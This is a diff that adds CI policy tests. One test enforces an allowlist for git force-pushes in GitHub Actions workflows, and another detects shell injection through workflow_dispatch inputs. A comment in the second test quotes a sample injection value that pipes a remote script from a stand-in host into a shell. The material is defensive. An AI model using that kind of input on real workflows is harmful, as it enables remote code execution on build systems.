@@ -136,3 +136,102 @@ def test_inventory_contains_known_workflows() -> None:
     glob ever returned an empty list. Pin a lower bound."""
     files = _iter_workflow_files()
     assert len(files) >= 10, f"workflow inventory shrank: {len(files)}"
+
+
+# ---------------------------------------------------------------------------
+# ADR-0024: --force-with-lease allowlist
+#
+# Repo policy prohibits ``git push --force*`` everywhere EXCEPT the entries
+# below, which are explicitly approved by ADR-0024 (2026-06-10).
+#
+# To add a new approved use:
+#   1. Update _FORCE_LEASE_ALLOWLIST with (workflow_filename, branch_glob).
+#   2. Open an ADR or amend ADR-0024 explaining why it is necessary.
+# ---------------------------------------------------------------------------
+
+_FORCE_LEASE_ALLOWLIST: frozenset[str] = frozenset({
+    # smc-live-newsapi-refresh.yml: rolling bot/live-news-snapshot cache
+    # cursor; force-with-lease with prior fetch. See ADR-0024.
+    "smc-live-newsapi-refresh.yml",
+})
+
+_FORCE_RE = re.compile(r"git\s+push\b[^\n]*--force")
+
+
+def test_workflow_force_push_is_allowlisted() -> None:
+    """Every ``--force*`` git push in a workflow ``run:`` block must appear
+    in ``_FORCE_LEASE_ALLOWLIST``.
+
+    Adding a new force-push requires:
+      * Updating the allowlist in this file.
+      * Opening / amending an ADR (see ADR-0024 as the template).
+
+    Rationale: ``--force`` and ``--force-with-lease`` are prohibited by
+    default (audit findings R3 / F-02 / F-05) because they can silently
+    overwrite commits on protected branches or lose human fix-up commits.
+    The allowlist makes each exception visible at PR review time.
+    """
+    offenders: list[str] = []
+    for wf_path in _iter_workflow_files():
+        if wf_path.name in _FORCE_LEASE_ALLOWLIST:
+            # Approved — still confirm the force-push is present (stale-entry guard).
+            any_force = any(
+                _FORCE_RE.search(run)
+                for _, run in _iter_run_blocks(wf_path)
+            )
+            if not any_force:
+                offenders.append(
+                    f"  {wf_path.name}: listed in _FORCE_LEASE_ALLOWLIST "
+                    f"but no 'git push --force*' found — remove the stale entry"
+                )
+            continue
+        for label, run_text in _iter_run_blocks(wf_path):
+            for line_no, line in enumerate(run_text.splitlines(), 1):
+                if line.lstrip().startswith("#"):
+                    continue
+                if _FORCE_RE.search(line):
+                    offenders.append(
+                        f"  [{wf_path.name} :: {label}] line {line_no}: {line.rstrip()}"
+                    )
+    assert not offenders, (
+        "Unapproved ``git push --force*`` found.\n"
+        "Add the workflow to ``_FORCE_LEASE_ALLOWLIST`` and open/amend an ADR "
+        "(see docs/adr/0024-force-with-lease-allowance-bot-snapshot-branches.md).\n"
+        "Offenders:\n" + "\n".join(offenders)
+    )
+
+
+# ---------------------------------------------------------------------------
+# A2: workflow_dispatch inputs must use env-var indirection, not direct
+# ${{ github.event.inputs.* }} interpolation inside run: blocks.
+# ---------------------------------------------------------------------------
+# Allowed: ${{ github.event.inputs.* }} inside an `env:` YAML key (GHA
+# processes these before the shell starts — no injection risk).
+# Forbidden: ${{ github.event.inputs.* }} appearing inside a shell `run:` block
+# (GHA template-preprocesses run: text BEFORE the shell parses it, so a
+# malicious input value like `"; curl evil.sh | sh #` would execute).
+# Audit pass-3 finding A2, 2026-06-10.
+_INPUT_EXPR_RE = re.compile(r"\$\{\{[^}]*github\.event\.inputs\.[^}]+\}\}")
+
+
+def test_workflow_dispatch_inputs_use_env_indirection() -> None:
+    """No ``${{ github.event.inputs.* }}`` expression may appear inside a
+    shell ``run:`` block — use a step-level or job-level ``env:`` mapping
+    instead and reference the value through its environment variable."""
+    offenders: list[str] = []
+    for wf_path in _iter_workflow_files():
+        for label, run_text in _iter_run_blocks(wf_path):
+            for line_no, line in enumerate(run_text.splitlines(), 1):
+                if line.lstrip().startswith("#"):
+                    continue
+                if _INPUT_EXPR_RE.search(line):
+                    offenders.append(
+                        f"  [{wf_path.name} :: {label}] line {line_no}: {line.rstrip()}"
+                    )
+    assert not offenders, (
+        "Direct ``${{ github.event.inputs.* }}`` interpolation found inside "
+        "run: blocks — shell-injection risk (audit pass-3 finding A2).\n"
+        "Move the input to the step's ``env:`` mapping and reference it as "
+        "``${ENV_VAR_NAME}`` in the shell script.\n"
+        "Offenders:\n" + "\n".join(offenders)
+    )
